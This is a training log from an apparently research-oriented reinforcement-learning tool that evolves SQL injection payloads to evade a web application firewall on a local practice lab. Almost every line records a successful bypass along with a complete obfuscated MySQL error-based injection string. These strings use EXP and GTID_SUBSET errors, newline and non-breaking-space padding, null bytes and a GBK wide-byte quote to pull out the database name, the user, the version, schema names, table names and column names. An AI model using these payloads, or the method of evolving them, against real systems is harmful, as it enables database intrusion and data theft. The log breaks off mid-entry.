/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run PPO on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — PPO Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Seed        : 2
============================================================
           payload: 1'%0aAnd%0aEXP(~(seLect%0a*%0aFROM%0a(SELect%0a((sELEct%0aJSON_ARRAYAGG(CONCAT(TaBle_schema,CHAR(46),taBLE_name))%0afrom%0aiNFOrMaTiON_sChEMA.TaBles%0
  [BYPASS] Ep 10314 | steps=12 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(sELect%0a*%0aFROM%0a(SelECT%0a(databAsE%a0()))a));%00
  [BYPASS] Ep 10315 | steps=5 | seq=func_sp_nbsp -> newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(SELect%0a*%0aFROM%0a(SELECt%0a(user%a0()))a));%00
  [BYPASS] Ep 10319 | steps=14 | seq=newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> agg_swap -> agg_swap -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SElEct%0a*%0aFROM%0a(seLEct%0a((sElecT%0aJSON_ARRAYAGG(schema_name)%0afroM%0aInFoRMAtioN_ScHemA.schemata)))a));%00
  [BYPASS] Ep 10320 | steps=5 | seq=agg_swap -> newline -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAND%0aEXP(~(selecT%0a*%0aFrOM%0a(sELeCt%0a(version%a0()))a));%00
  Ep 10320 | SR=50% | Steps=12.0 | R=-26.19
  [BYPASS] Ep 10321 | steps=5 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(selecT%0a*%0aFROM%0a(sEleCT%0a(user%a0()))a));%00
  [BYPASS] Ep 10323 | steps=6 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> case
           payload: 1'%0aaND%0aEXP(~(seLEct%0a*%0afrOM%0a(seLect%0a((selECt%0aJSON_ARRAYAGG(column_name)%0afROM%0ainFORMaTIoN_sCHeMA.columns%0awHEre%0atablE_schema=dATaBa
  [BYPASS] Ep 10327 | steps=6 | seq=newline -> func_sp_nbsp -> agg_swap -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0aaND%0aGTID_SUBSET((dAtabAsE%a0()),1);%00
  [BYPASS] Ep 10330 | steps=11 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> agg_swap -> func_sp_nbsp -> agg_swap -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(SelEcT%0a*%0aFRom%0a(SELect%0a((SeLect%0aJSON_ARRAYAGG(column_name)%0aFrOM%0aInFOrMATioN_SCHEma.columns%0aWheRE%0aTaBLe_schema=DATABA
  Ep 10330 | SR=40% | Steps=11.8 | R=-24.38
  [BYPASS] Ep 10331 | steps=5 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10332 | steps=7 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(SeLecT%0a*%0aFrom%0a(sELeCT%0a((sElect%0aCoNcat(CHAR(124),JSON_ARRAYAGG(TaBLE_name),CHAR(124))%0afrom%0aiNformation_schEMA.tAbles%0aw
  [BYPASS] Ep 10337 | steps=9 | seq=func_sp_nbsp -> agg_swap -> newline -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aanD%0aEXP(~(sELect%0a*%0afRom%0a(seLect%0a((SElECt%0aJSON_ARRAYAGG(TAbLE_name)%0afRom%0aInforMAtiOn_Schema.tables%0awHere%0aTaBLE_schema=dAtAbasE
  [BYPASS] Ep 10340 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10340 | SR=40% | Steps=11.4 | R=-24.70
  [BYPASS] Ep 10341 | steps=13 | seq=newline -> func_sp_nbsp -> case -> newline -> gbk_bypass -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> agg_swap -> concat_char -> null_byte
           payload: 1%bf%27%0aAnD%0aEXP(~(sELect%0a*%0afrOm%0a(SElect%0a((sELECt%0aJSON_ARRAYAGG(schema_name)%0afROm%0ainfORMATION_schema.schemata)))a));%00
  [BYPASS] Ep 10342 | steps=15 | seq=newline -> hex_to_char -> func_sp_nbsp -> case_split -> null_byte -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> agg_swap -> newline -> null_byte -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aaND%0aEXP(~(seLEcT%0a*%0aFrom%0a(sELeCT%0a((sElECt%0aJSON_ARRAYAGG(TabLe_name)%0afROm%0aiNFORMAtiON_ScHEMA.TaBLes%0awhERE%0aTabLe_schema=DatAbase
  [BYPASS] Ep 10347 | steps=4 | seq=newline -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0aANd%0aEXP(~(seleCt%0a*%0aFroM%0a(seleCT%0a(version%a0()))a));%00
  [BYPASS] Ep 10349 | steps=6 | seq=newline -> func_sp_nbsp -> null_byte -> case -> func_sp_nbsp -> agg_swap
           payload: 1'%0aAND%0aEXP(~(SELecT%0a*%0afrOm%0a(seLecT%0a((sElEct%0aJSON_ARRAYAGG(tabLe_name)%0afRom%0aInFOrmaTion_ScHEma.TAbLEs%0awHERe%0ataBLE_schema=DATabASE
  Ep 10350 | SR=40% | Steps=12.8 | R=-28.28
  [BYPASS] Ep 10351 | steps=4 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10352 | steps=3 | seq=func_sp_nbsp -> newline -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10353 | steps=7 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> null_byte -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(sEleCt%0a*%0afRoM%0a(SElEcT%0a(user%a0()))a));%00
  [BYPASS] Ep 10360 | steps=5 | seq=case -> newline -> func_sp_nbsp -> null_byte -> agg_swap
           payload: 1'%0aanD%0aEXP(~(SelECt%0a*%0aFrOM%0a(sElEcT%0a((seleCT%0aJSON_ARRAYAGG(schema_name)%0afroM%0aINfOrmAtiOn_SCHEMA.schemata)))a));%00
  Ep 10360 | SR=40% | Steps=10.9 | R=-22.26
  Ep 10370 | SR=0% | Steps=15.0 | R=-38.74
  [BYPASS] Ep 10371 | steps=13 | seq=between_space -> agg_swap -> newline -> newline -> null_byte -> func_sp_nbsp -> newline -> agg_swap -> agg_swap -> newline -> newline -> agg_swap -> case
           payload: 1'%a0AnD%a0EXP(~(sElECT%a0*%a0frOM%a0(SEleCT%a0((selEct%a0JSON_ARRAYAGG(TabLe_name)%a0fROM%a0INForMAtION_sChemA.Tables%a0WHERe%a0tABlE_schema=dATAbAse
  [BYPASS] Ep 10376 | steps=11 | seq=func_sp_nbsp -> agg_swap -> newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> agg_swap -> agg_swap -> case
           payload: 1'%0aAND%0aEXP(~(SeLect%0a*%0aFROM%0a(SeLeCT%0a(version%a0()))a));%00
  [BYPASS] Ep 10377 | steps=9 | seq=newline -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> null_byte -> null_byte -> func_sp_nbsp -> case -> agg_swap
           payload: 1'%0aanD%0aEXP(~(SElECt%0a*%0afRoM%0a(sElECt%0a((SELEct%0aJSON_ARRAYAGG(column_name)%0aFRom%0aiNfORmAtIoN_sCHeMA.columns%0awHeRE%0aTaBLe_schema=dATABa
  [BYPASS] Ep 10379 | steps=12 | seq=newline -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> agg_swap -> agg_swap -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(SeLECt%0a*%0aFroM%0a(SELeCt%0a((sELect%0aJSON_ARRAYAGG(column_name)%0aFRoM%0ainforMAtiON_sCheMA.columns%0awHere%0atable_schema=DATAbA
  Ep 10380 | SR=40% | Steps=13.5 | R=-31.07
  [BYPASS] Ep 10382 | steps=6 | seq=newline -> func_sp_nbsp -> case -> null_byte -> null_byte -> agg_swap
           payload: 1'%0aAnD%0aEXP(~(SeLecT%0a*%0aFROM%0a(seLeCT%0a((selecT%0aJSON_ARRAYAGG(TAble_name)%0aFrOm%0aINFOrMatiON_scheMA.TAbLEs%0awHEre%0aTAbLE_schema=DATAbaSE
  [BYPASS] Ep 10383 | steps=10 | seq=newline -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SElecT%0a*%0afrom%0a(selECt%0a(user%a0()))a));%00
  [BYPASS] Ep 10388 | steps=8 | seq=null_byte -> hex_to_char -> func_sp_nbsp -> null_byte -> case -> agg_swap -> agg_swap -> newline
           payload: 1'%0aANd%0aEXP(~(SelecT%0a*%0afrOM%0a(sELeCt%0a((SEleCT%0aConcat(CHAR(124),JSON_ARRAYAGG(TaBLE_name),CHAR(124))%0afROM%0aInFORmATION_SchEMa.taBlEs%0aW
  Ep 10390 | SR=30% | Steps=12.9 | R=-28.27
  [BYPASS] Ep 10392 | steps=6 | seq=null_byte -> newline -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aAnD%0aEXP(~(SeLECT%0a*%0afRoM%0a(seLeCt%0a(dATaBaSE%a0()))a));%00
  [BYPASS] Ep 10393 | steps=5 | seq=newline -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aand%0aEXP(~(seLECT%0a*%0afroM%0a(sELECt%0a(user%a0()))a));%00
  [BYPASS] Ep 10394 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10395 | steps=7 | seq=newline -> null_byte -> case -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap
           payload: 1'%0aanD%0aEXP(~(SELEct%0a*%0aFrOm%0a(sEleCT%0a((sELEct%0aJSON_ARRAYAGG(TABle_name)%0aFrom%0ainfORMATiON_ScHema.TaBLes%0aWherE%0atAbLe_schema=DAtAbasE
  [BYPASS] Ep 10396 | steps=9 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> case
           payload: 1'%0aand%0aEXP(~(sELeCT%0a*%0afrOM%0a(sElect%0a((sELeCt%0aJSON_ARRAYAGG(schema_name)%0afrOm%0aiNFormatiOn_SchEmA.schemata)))a));%00
  [BYPASS] Ep 10397 | steps=7 | seq=func_sp_nbsp -> agg_swap -> newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAND%0aEXP(~(sEleCT%0a*%0afrom%0a(sELect%0a(user%a0()))a));%00
  [BYPASS] Ep 10398 | steps=8 | seq=null_byte -> hex_to_char -> null_byte -> agg_swap -> newline -> func_sp_nbsp -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SelecT%0a*%0afrom%0a(SelECT%0a((sELEct%0acOnCat(CHAR(124),JSON_ARRAYAGG(tAbLE_name),CHAR(124))%0afrOM%0aInFoRMaTion_SChEMa.TabLes%0aw
  Ep 10400 | SR=70% | Steps=9.0 | R=-11.65
  [BYPASS] Ep 10404 | steps=4 | seq=newline -> null_byte -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SeLecT%0a*%0aFROM%0a(SelECT%0a((sELEcT%0aJSON_ARRAYAGG(schema_name)%0aFRom%0aiNformATiOn_sCHEma.schemata)))a));%00
  [BYPASS] Ep 10409 | steps=8 | seq=hex_to_char -> null_byte -> newline -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte -> agg_swap
           payload: 1'%0aAND%0aEXP(~(SelECT%0a*%0afROM%0a(sELeCt%0a((seleCt%0aJSON_ARRAYAGG(CONCAT(TabLe_schema,CHAR(46),tABlE_name))%0aFrom%0aInfORMATIoN_sChEMA.TaBLEs%0
  Ep 10410 | SR=20% | Steps=13.2 | R=-32.69
  [BYPASS] Ep 10414 | steps=9 | seq=agg_swap -> newline -> func_sp_nbsp -> case -> hex_to_char -> agg_swap -> case -> agg_swap -> null_byte
           payload: 1'%0aAnd%0aEXP(~(SelEct%0a*%0afroM%0a(SElECT%0a((SeleCT%0aJSON_ARRAYAGG(TABLE_name)%0afROm%0aINFORMaTIon_schemA.tabLEs%0aWhErE%0atAblE_schema=DAtAbASE
  [BYPASS] Ep 10416 | steps=3 | seq=null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10420 | steps=13 | seq=func_sp_nbsp -> newline -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> agg_swap -> null_byte -> agg_swap -> null_byte -> agg_swap -> agg_swap -> case
           payload: 1'%0aanD%0aEXP(~(seLEcT%0a*%0aFROM%0a(sEleCt%0a((sELecT%0aJSON_ARRAYAGG(column_name)%0afrom%0aiNfORMatIoN_ScHeMA.columns%0aWherE%0atABLe_schema=DATAba
  Ep 10420 | SR=30% | Steps=13.0 | R=-30.13
  [BYPASS] Ep 10424 | steps=13 | seq=func_sp_nbsp -> newline -> null_byte -> null_byte -> agg_swap -> null_byte -> agg_swap -> agg_swap -> null_byte -> null_byte -> agg_swap -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(sELECt%0a*%0afRoM%0a(SelECt%0a(version%a0()))a));%00
  [BYPASS] Ep 10426 | steps=8 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> null_byte -> case
           payload: 1'%0aAND%0aEXP(~(SeLect%0a*%0afRoM%0a(seLecT%0a(user%a0()))a));%00
  [BYPASS] Ep 10427 | steps=7 | seq=hex_to_char -> func_sp_nbsp -> case -> null_byte -> null_byte -> agg_swap -> newline
           payload: 1'%0aanD%0aEXP(~(sELecT%0a*%0aFROm%0a(SEleCT%0a((SelEcT%0aconcAt(CHAR(124),JSON_ARRAYAGG(tAbLe_name),CHAR(124))%0afROm%0aiNfORmATiON_sChemA.TABlEs%0aw
  Ep 10430 | SR=30% | Steps=13.3 | R=-29.59
  [BYPASS] Ep 10433 | steps=11 | seq=newline -> func_sp_nbsp -> null_byte -> case -> null_byte -> case -> func_sp_nbsp -> null_byte -> null_byte -> newline -> agg_swap
           payload: 1'%0aANd%0aEXP(~(seLEct%0a*%0afroM%0a(SElect%0a((SelEcT%0aJSON_ARRAYAGG(column_name)%0afroM%0ainformATIOn_scHEmA.columns%0awHere%0aTABLE_schema=databA
  [BYPASS] Ep 10438 | steps=7 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> func_sp_ff -> func_sp_nbsp -> case
           payload: 1'%0aANd%0aEXP(~(SElECT%0a*%0aFrom%0a(SelECt%0a(user%a0()))a));%00
  [BYPASS] Ep 10439 | steps=10 | seq=hex_to_char -> newline -> func_sp_nbsp -> agg_swap -> case -> func_sp_nbsp -> case -> func_sp_nbsp -> agg_swap -> null_byte
           payload: 1'%0aand%0aEXP(~(sElECt%0a*%0afrOm%0a(sELeCT%0a((seleCt%0aJSON_ARRAYAGG(coNcaT(TaBLE_schema,CHAR(46),tABLe_name))%0afROm%0aInForMaTION_ScheMa.tABLes%0
  Ep 10440 | SR=30% | Steps=13.3 | R=-31.27
  [BYPASS] Ep 10441 | steps=6 | seq=hex_to_char -> null_byte -> newline -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aaNd%0aEXP(~(SeLect%0a*%0aFRom%0a(selEcT%0a((seLEcT%0aJSON_ARRAYAGG(conCat(TaBlE_schema,CHAR(46),taBle_name))%0aFRom%0aInfOrMATion_scHEMA.TAblEs%0
  [BYPASS] Ep 10443 | steps=11 | seq=hex_to_char -> func_sp_nbsp -> agg_swap -> newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte -> func_sp_nbsp -> agg_swap -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(sELEct%0a*%0aFROm%0a(sEleCT%0a((SElECT%0aConcAT(CHAR(124),JSON_ARRAYAGG(tABlE_name),CHAR(124))%0afRom%0aInfOrMaTiOn_sCHEMA.taBLes%0aW
  [BYPASS] Ep 10444 | steps=10 | seq=newline -> null_byte -> agg_swap -> null_byte -> func_sp_nbsp -> null_byte -> agg_swap -> agg_swap -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(SELect%0a*%0afrom%0a(SeLECt%0a(user%a0()))a));%00
  [BYPASS] Ep 10450 | steps=11 | seq=newline -> func_sp_nbsp -> func_sp_nbsp -> agg_swap -> func_sp_nbsp -> null_byte -> null_byte -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aAnd%0aEXP(~(sELecT%0a*%0aFROm%0a(selecT%0a((seleCt%0aJSON_ARRAYAGG(schema_name)%0aFroM%0ainformatiOn_scHEMa.schemata)))a));%00
  Ep 10450 | SR=40% | Steps=12.8 | R=-29.72
  [BYPASS] Ep 10451 | steps=3 | seq=newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10453 | steps=5 | seq=newline -> agg_swap -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnD%0aEXP(~(SELECt%0a*%0afrom%0a(seLect%0a((sElECT%0aJSON_ARRAYAGG(tabLe_name)%0afRoM%0aInfOrMAtION_SChEMA.TABlEs%0awHEre%0aTabLe_schema=DATabAsE
  [BYPASS] Ep 10455 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 10460 | SR=30% | Steps=11.6 | R=-25.83
  [BYPASS] Ep 10461 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10462 | steps=7 | seq=hex_to_char -> newline -> func_sp_nbsp -> func_sp_nbsp -> case -> null_byte -> agg_swap
           payload: 1'%0aand%0aEXP(~(seLEcT%0a*%0afRom%0a(seLEcT%0a((seLeCt%0aJSON_ARRAYAGG(CONCAT(tAbLe_schema,CHAR(46),tabLe_name))%0aFrOM%0aINfOrMatION_SChEma.tablEs%0
  Ep 10470 | SR=20% | Steps=13.0 | R=-31.19
  [BYPASS] Ep 10474 | steps=9 | seq=newline -> null_byte -> agg_swap -> null_byte -> agg_swap -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(seLect%0a*%0aFRoM%0a(SElect%0a((selecT%0aJSON_ARRAYAGG(taBLE_name)%0aFrOm%0aInFoRMaTiOn_sCheMa.tABLEs%0aWherE%0ataBLe_schema=DatAbASe
  [BYPASS] Ep 10475 | steps=8 | seq=newline -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> null_byte -> agg_swap -> case
           payload: 1'%0aAND%0aEXP(~(seLeCt%0a*%0afroM%0a(SElect%0a(version%a0()))a));%00
  [BYPASS] Ep 10476 | steps=6 | seq=hex_to_char -> newline -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aAnD%0aEXP(~(SEleCt%0a*%0afRom%0a(SElECT%0a((sELeCt%0aJSON_ARRAYAGG(CoNcAt(TaBlE_schema,CHAR(46),tAbLe_name))%0aFROM%0aINformAtiON_sCheMa.tABLEs%0
  [BYPASS] Ep 10478 | steps=6 | seq=newline -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aaND%0aEXP(~(seLecT%0a*%0aFrOM%0a(SeLEct%0a(version%a0()))a));%00
  Ep 10480 | SR=40% | Steps=11.9 | R=-25.29
  [BYPASS] Ep 10485 | steps=7 | seq=newline -> func_sp_nbsp -> agg_swap -> agg_swap -> case -> agg_swap -> null_byte
           payload: 1'%0aANd%0aEXP(~(SELECt%0a*%0afRoM%0a(SeLect%0a(DAtABAsE%a0()))a));%00
  [BYPASS] Ep 10487 | steps=8 | seq=hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> null_byte -> agg_swap -> null_byte -> case
           payload: 1'%0aAnd%0aEXP(~(SELeCT%0a*%0afroM%0a(SelECt%0a((sELeCT%0acOncAT(CHAR(124),JSON_ARRAYAGG(tABle_name),CHAR(124))%0aFroM%0aInFORMatIon_sChEma.taBlEs%0aw
  Ep 10490 | SR=20% | Steps=13.5 | R=-32.77
  [BYPASS] Ep 10493 | steps=11 | seq=null_byte -> hex_to_char -> agg_swap -> newline -> func_sp_nbsp -> null_byte -> null_byte -> null_byte -> agg_swap -> func_sp_nbsp -> case
           payload: 1'%0aaND%0aEXP(~(sEleCT%0a*%0afroM%0a(sELecT%0a((SeLECT%0aConcat(CHAR(124),JSON_ARRAYAGG(tABLe_name),CHAR(124))%0afROM%0ainfORMaTiON_sCHEma.TABles%0aW
  [BYPASS] Ep 10500 | steps=7 | seq=newline -> null_byte -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> case
           payload: 1'%0aANd%0aEXP(~(selEct%0a*%0afROM%0a(sELect%0a((SeLeCt%0aJSON_ARRAYAGG(tABlE_name)%0aFroM%0aINFOrmatiON_ScheMa.TaBLes%0awhEre%0aTablE_schema=DataBaSe
  Ep 10500 | SR=20% | Steps=13.8 | R=-34.05
  [BYPASS] Ep 10509 | steps=10 | seq=newline -> null_byte -> func_sp_nbsp -> agg_swap -> agg_swap -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> case
           payload: 1'%0aand%0aEXP(~(SElect%0a*%0aFROm%0a(SeLecT%0a(daTaBase%a0()))a));%00
  Ep 10510 | SR=10% | Steps=14.5 | R=-35.93
  [BYPASS] Ep 10512 | steps=9 | seq=func_sp_nbsp -> agg_swap -> newline -> func_sp_nbsp -> null_byte -> agg_swap -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(selECt%0a*%0afRoM%0a(SELect%0a(DAtABASE%a0()))a));%00
  [BYPASS] Ep 10515 | steps=7 | seq=newline -> null_byte -> hex_to_char -> func_sp_nbsp -> null_byte -> case -> agg_swap
           payload: 1'%0aANd%0aEXP(~(sElECt%0a*%0afroM%0a(SelEct%0a((SeleCT%0aJSON_ARRAYAGG(CONCAT(TAblE_schema,CHAR(46),tAbLe_name))%0afrOm%0aiNFORmAtiON_SChema.TaBles%0
  [BYPASS] Ep 10516 | steps=4 | seq=newline -> hex_to_char -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10520 | steps=5 | seq=newline -> null_byte -> agg_swap -> case -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(seLeCt%0a*%0aFRoM%0a(SeLECt%0a((SElECt%0aJSON_ARRAYAGG(TAbLe_name)%0afrOM%0ainFoRmaTion_ScheMA.taBlEs%0aWheRe%0aTABLe_schema=DatAbase
  Ep 10520 | SR=40% | Steps=11.5 | R=-24.58
  [BYPASS] Ep 10524 | steps=6 | seq=newline -> agg_swap -> func_sp_nbsp -> null_byte -> agg_swap -> case
           payload: 1'%0aaNd%0aEXP(~(SeleCt%0a*%0aFROM%0a(SelEcT%0a(user%a0()))a));%00
  [BYPASS] Ep 10527 | steps=5 | seq=func_sp_nbsp -> null_byte -> func_sp_nbsp -> agg_swap -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 10528 | steps=7 | seq=func_sp_nbsp -> newline -> func_sp_nbsp -> agg_swap -> null_byte -> agg_swap -> case
           payload: 1'%0aANd%0aEXP(~(SelEcT%0a*%0afRoM%0a(seLecT%0a(user%a0()))a));%00
  Ep 10530 | SR=30% | Steps=12.3 | R=-25.33
  [BYPASS] Ep 10531 | steps=5 | seq=newline -> func_sp_nbsp -> null_byte -> case -> agg_swap
           payload: 1'%0aaNd%0aEXP(~(sEleCt%0a*%0afroM%0a(sELecT%0a((seleCt%0aJSON_ARRAYAGG(column_name)%0afrOm%0aINfORMATioN_ScHEMa.columns%0awHEre%0atabLe_schema=DaTABA
  [BYPASS] Ep 10538 | steps=9 | seq=newline -> func_sp_nbsp -> hex_to_char -> null_byte -> func_sp_nbsp -> null_byte -> null_byte -> agg_swap -> case
           payload: 1'%0aANd%0aEXP(~(seleCT%0a*%0afROm%0a(SeleCT%0a((seLecT%0aJSON_ARRAYAGG(schema_name)%0afrOm%0aINfOrMaTIon_ScHema.schemata)))a));%00
  [BYPASS] Ep 10539 | steps=4 | seq=null_byte -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00
  [BYPASS] Ep 10540 | steps=12 | seq=hex_to_char -> agg_swap -> newline -> null_byte -> null_byte -> null_byte -> agg_swap -> agg_swap -> agg_swap -> agg_swap -> null_byte -> case
           payload: 1'%0aAND%0aEXP(~(SElect%0a*%0afRom%0a(sELeCT%0a((seleCT%0aJSON_ARRAYAGG(conCAT(tAbLE_schema,CHAR(46),tABle_name))%0aFRoM%0aInFormatioN_SChEMa.tABles%0
  Ep 10540 | SR=40% | Steps=12.0 | R=-26.76
  [BYPASS] Ep 10545 | steps=4 | seq=newline -> agg_swap -> null_byte -> case
           payload: 1'%0aANd%0aEXP(~(sELect%0a*%0afROm%0a(SELECt%0a((SeleCT%0aJSON_ARRAYAGG(schema_name)%0afRom%0aiNfoRmation_SCHEMA.schemata)))a));%00
  [BYPASS] Ep 10549 | steps=5 | seq=null_byte -> newline -> agg_swap -> comment -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 10550 | steps=3 | seq=func_sp_nbsp -> null_byte -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 10550 | SR=30% | Steps=11.7 | R=-27.02
  [BYPASS] Ep 10554 | steps=8 | seq=hex_to_char -> newline -> null_byte -> case -> null_byte -> case -> func_sp_nbsp -> agg_swap
           payload: 1'%0aAnd%0aEXP(~(SELeCT%0a*%0afROM%0a(seLEcT%0a((SelEct%0aJSON_ARRAYAGG(CONCAT(TABLE_schema,CHAR(46),tAbLe_name))%0afrOM%0ainFormAtION_ScHema.tables%0
  [BYPASS] Ep 10555 | steps=6 | seq=newline -> case -> func_sp_nbsp -> null_byte -> case -> agg_swap
